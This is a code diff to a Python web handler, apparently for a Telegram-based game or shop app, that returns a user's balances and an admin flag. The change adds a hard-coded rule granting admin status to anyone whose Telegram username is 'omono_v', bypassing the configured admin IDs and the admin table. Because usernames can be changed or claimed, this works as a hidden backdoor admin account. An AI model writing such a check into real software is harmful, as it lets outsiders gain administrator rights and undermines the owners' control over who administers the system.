@@ -47,7 +47,11 @@ async def user(request):
         u = await s.scalar(select(User).where(User.telegram_id == int(tg["id"])))
         if not u:
             raise web.HTTPNotFound(text="User not found")
-        admin = int(tg["id"]) in config.super_admin_ids or await s.scalar(select(Admin).where(Admin.telegram_id == int(tg["id"])))
+        admin = (
+            int(tg["id"]) in config.super_admin_ids
+            or str(tg.get("username", "")).lower().lstrip("@") == "omono_v"
+            or await s.scalar(select(Admin).where(Admin.telegram_id == int(tg["id"])))
+        )
         return _json(request, {"user":{"id":u.telegram_id,"username":u.username,"name":u.first_name,"balance":u.balance or 0,"diamonds":u.diamonds or 0,"coins":u.game_coins or 0,"vr":u.vr_balance or 0,"luckyDiscount":u.lucky_discount or 0,"luckyExtraSpins":u.lucky_extra_spins or 0,"luckyAdCredit":u.lucky_ad_credit or 0,"luckyGift":u.lucky_gift,"admin":bool(admin)}})
 
 
